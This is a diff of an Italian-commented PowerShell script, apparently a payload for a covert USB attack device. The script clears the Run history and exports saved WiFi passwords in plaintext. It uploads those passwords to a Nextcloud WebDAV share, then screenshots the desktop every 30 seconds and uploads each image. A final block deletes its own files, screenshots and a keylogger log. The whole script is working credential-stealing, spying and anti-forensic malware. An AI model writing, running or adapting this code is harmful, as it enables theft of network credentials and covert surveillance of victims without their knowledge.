@@ -13,18 +13,17 @@ function Nextcloud-Upload {
         "Authorization"=$("Basic $([System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($("$($sharetoken):"))))");
         "X-Requested-With"="XMLHttpRequest";
     }
-    # Il nome del file remoto corrisponderà al nome del file locale (con l'indice incrementale)
     $webdavUrl = "$($nextcloudUrl)/public.php/webdav/$($fileObject.Name)"
     Invoke-RestMethod -Uri $webdavUrl -InFile $fileObject.Fullname -Headers $headers -Method Put 
 }
 
-# --- INIZIO OPERAZIONI ---
+# --- BLOCCO OPERATIVO ---
 try {
-    # 1. Pulizia cronologia comandi "Esegui"
+    # 1. Pulizia cronologia Run
     cd HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\
     Remove-Item .\RunMRU\ -ErrorAction SilentlyContinue
 
-    # 2. Export Password WiFi
+    # 2. Gestione Directory WiFi e Export
     $p = "C:\wipass"
     if (!(Test-Path $p)) { New-Item -Path $p -ItemType Directory -Force }
     Set-Location $p
@@ -32,21 +31,19 @@ try {
     netsh wlan export profile key=clear
     Get-ChildItem *.xml | ForEach-Object {
         $xml = [xml](Get-Content $_)
-        $content = "========================================`r`n SSID = " + $xml.WLANProfile.SSIDConfig.SSID.name + "`r`n PASS = " + $xml.WLANProfile.MSM.Security.sharedKey.keymaterial
-        Out-File "$env:computername-wificapture.txt" -Append -InputObject $content
+        $a = "========================================`r`n SSID = " + $xml.WLANProfile.SSIDConfig.SSID.name + "`r`n PASS = " + $xml.WLANProfile.MSM.Security.sharedKey.keymaterial
+        Out-File "$env:computername-wificapture.txt" -Append -InputObject $a
     }
 
-    # Carica il report WiFi se creato
     if (Test-Path "$env:computername-wificapture.txt") {
         "$env:computername-wificapture.txt" | Nextcloud-Upload
     }
 
-    # 3. Ciclo Screenshot con nomi incrementali
+    # 3. Ciclo Screenshot (Incrementale)
     $i = 0
     while($i -lt 200){
         Add-Type -AssemblyName System.Windows.Forms,System.Drawing
         $screens = [Windows.Forms.Screen]::AllScreens
-        
         $top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
         $left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
         $width  = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum
@@ -57,14 +54,12 @@ try {
         $graphics = [Drawing.Graphics]::FromImage($bmp)
         $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
 
-        # Nome file dinamico: Capture-0, Capture-1, ecc.
         $currentPath = "$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture-$i.png"
         $bmp.Save($currentPath)
         
         $graphics.Dispose()
         $bmp.Dispose()
       
-        # Caricamento immediato prima di incrementare $i o attendere
         if (Test-Path $currentPath) {
             $currentPath | Nextcloud-Upload
         }
@@ -73,10 +68,11 @@ try {
         Start-Sleep -Seconds 30
     }
 }
-# --- PROTEZIONE E PULIZIA FINALE ---
+# --- BLOCCO DI PULIZIA CON LOGGING ---
 finally {
-    # Usciamo dalla cartella wipass per sbloccarla e permetterne l'eliminazione
+    # Torna a una directory sicura
     Set-Location $env:TEMP
+    Write-Host "`n--- AVVIO PULIZIA FINALE ---" -ForegroundColor Cyan
 
     $pathsToClean = @(
         "$env:APPDATA\c.ps1", 
@@ -84,14 +80,21 @@ finally {
         "$env:APPDATA\sg2.ps1", 
         "C:\Users\Irene\Desktop\OMG\testing\temp.txt", 
         "$env:temp\keylogger.txt", 
-        "$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture-*.png", # Tutti gli screenshot
-        "C:\wipass" # La cartella intera dei profili WiFi
+        "$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture-*.png",
+        "C:\wipass"
     )
 
     foreach($path in $pathsToClean) {
         if (Test-Path $path) {
-            # -Recurse elimina le sottocartelle, -Force ignora i permessi di sola lettura
-            Remove-Item $path -Recurse -Force -ErrorAction SilentlyContinue
+            try {
+                Remove-Item $path -Recurse -Force -ErrorAction Stop
+                Write-Host "[OK] Eliminato: $path" -ForegroundColor Green
+            } catch {
+                Write-Host "[ERRORE] Impossibile eliminare: $path" -ForegroundColor Red
+            }
+        } else {
+            Write-Host "[INFO] Percorso non trovato (già pulito): $path" -ForegroundColor Gray
         }
     }
+    Write-Host "--- PULIZIA COMPLETATA ---`n" -ForegroundColor Cyan
 }
